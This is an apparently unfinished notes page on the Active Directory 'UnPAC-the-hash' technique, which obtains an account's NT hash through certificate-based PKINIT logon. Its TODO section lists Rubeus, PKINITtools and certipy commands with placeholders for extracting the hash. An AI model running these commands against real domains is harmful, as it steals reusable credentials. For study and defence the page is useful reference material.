**UnPAC-the-hash** — logging in with a certificate normally gets you only a Kerberos ticket, but this technique also squeezes out the account's NT hash — the password-equivalent value reused for NTLM logons. After you pre-authenticate with the certificate via PKINIT (Kerberos' certificate-based logon), the KDC (the domain's ticket-issuing server) hands back the NTLM hash tucked inside the PAC_CREDENTIAL_INFO — a field of the PAC, the part of a Kerberos ticket that carries your identity and credentials — of the returned TGT (the domain's master login ticket). So any certificate you obtain (from ADCS, Shadow Credentials, or a Golden Certificate) yields the reusable NT hash, not just a ticket.

```
cert -> PKINIT pre-auth -> KDC returns TGT
   -> TGT's PAC_CREDENTIAL_INFO field holds the NTLM hash
   -> extract it -> reusable NT hash
```

## TODO

Placeholder - full write-up pending. Should cover:
- `Rubeus.exe asktgt /user:USER /certificate:CERT.pfx /password:PFX_PASS /getcredentials /nowrap` (Windows).
- Linux: `gettgtpkinit.py -cert-pfx CERT.pfx DOMAIN/USER out.ccache` → `getnthash.py DOMAIN/USER -key ENCRYPTION_KEY`; or `certipy auth -pfx CERT.pfx`.
- Chains from [Pass the Cert](Pass%20the%20Cert.md), [Shadow Credentials](../ACL%20Attacks/Shadow%20Credentials%20Attack%20Guide.md), and cert-based relay (ESC8).

## References

- The Hacker Recipes - UnPAC the hash - https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash
- PKINITtools - https://github.com/dirkjanm/PKINITtools
